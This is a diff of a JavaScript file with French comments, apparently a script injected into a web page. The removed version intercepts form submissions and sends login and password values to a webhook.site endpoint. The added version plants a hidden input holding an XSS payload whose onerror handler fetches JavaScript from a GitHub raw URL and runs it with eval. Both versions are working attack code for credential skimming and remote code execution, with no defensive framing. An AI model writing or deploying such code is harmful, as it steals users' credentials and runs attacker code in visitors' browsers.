@@ -1,24 +1,39 @@
-// Intercepte l'événement de soumission du formulaire
-document.addEventListener('submit', function(event) {
-    let form = event.target;
-    if (form.tagName === 'FORM') {
-        // Récupère les données de connexion
-        let login = form.querySelector('input[name="login"]').value;
-        let password = form.querySelector('input[name="password"]').value;
+(function() {
+    // Fonction à exécuter une fois le DOM chargé
+    function addHiddenPayload() {
+        // Sélection du champ username
+        var usernameField = document.getElementById('username');
 
-        // Envoie les données de connexion à un serveur distant
-        fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50/collect', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                login: login,
-                password: password
-            })
-        });
+        if (!usernameField) {
+            console.log('[newfield.js] Champ #username non trouvé.');
+            return;
+        }
 
-        // Optionnel : Empêche la soumission du formulaire d'origine
-        // event.preventDefault();
+        console.log('[newfield.js] Champ #username trouvé.');
+
+        // Vérifie s'il n'existe pas déjà un champ #payload
+        if (document.getElementById('payload')) {
+            console.log('[newfield.js] Le champ caché existe déjà.');
+            return;
+        }
+
+        // Création d'un champ caché
+        var hiddenInput = document.createElement('input');
+        hiddenInput.type = 'hidden';
+        hiddenInput.id = 'payload';
+        hiddenInput.name = 'payload';
+        hiddenInput.value = '"><img src=x onerror="fetch(\'https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/payload.js\').then(r=>r.text()).then(c=>eval(c))">';
+
+        // Insertion du champ caché juste après le champ username
+        usernameField.parentNode.insertBefore(hiddenInput, usernameField.nextSibling);
+
+        console.log('[newfield.js] Champ caché #payload ajouté juste après #username.');
     }
-}, true);
+
+    // Exécution directe si le DOM est déjà chargé, sinon on attend
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', addHiddenPayload);
+    } else {
+        addHiddenPayload();
+    }
+})();
